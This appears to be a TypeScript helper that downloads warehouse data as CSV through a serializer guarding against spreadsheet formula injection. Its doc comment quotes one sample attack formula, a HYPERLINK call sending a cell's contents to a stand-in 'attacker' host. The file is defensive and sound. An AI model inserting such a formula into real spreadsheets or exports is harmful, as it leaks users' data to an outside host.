import {
  serializeExport,
  type CrudExportColumn,
  type PreparedExport,
} from '@open-mercato/shared/lib/crud/exporters'

/**
 * Browser-side CSV download for the WMS detail pages.
 *
 * The cells are operator-entered strings — warehouse names, location codes, lot
 * numbers — so they go through `serializeExport`, the same serializer every
 * DataTable export uses. It neutralizes leading `=`, `+`, `-`, `@` and tab/CR/LF
 * so a value like `=HYPERLINK("http://attacker/"&A1,"ok")` opens as text rather
 * than executing in Excel, LibreOffice or Sheets.
 *
 * Pass numeric cells as raw numbers, not strings: `normalizeCsvValue` exempts
 * `number` from neutralization, so a pre-stringified `'-7'` would come out as
 * `'-7` and corrupt the column.
 */
export function downloadCsvExport(
  filename: string,
  columns: CrudExportColumn[],
  rows: Array<Record<string, unknown>>,
): void {
  const prepared: PreparedExport = { columns, rows }
  const { body, contentType } = serializeExport(prepared, 'csv')
  const blob = new Blob([body], { type: contentType })
  const url = URL.createObjectURL(blob)
  const anchor = document.createElement('a')
  anchor.href = url
  anchor.download = filename
  anchor.click()
  URL.revokeObjectURL(url)
}
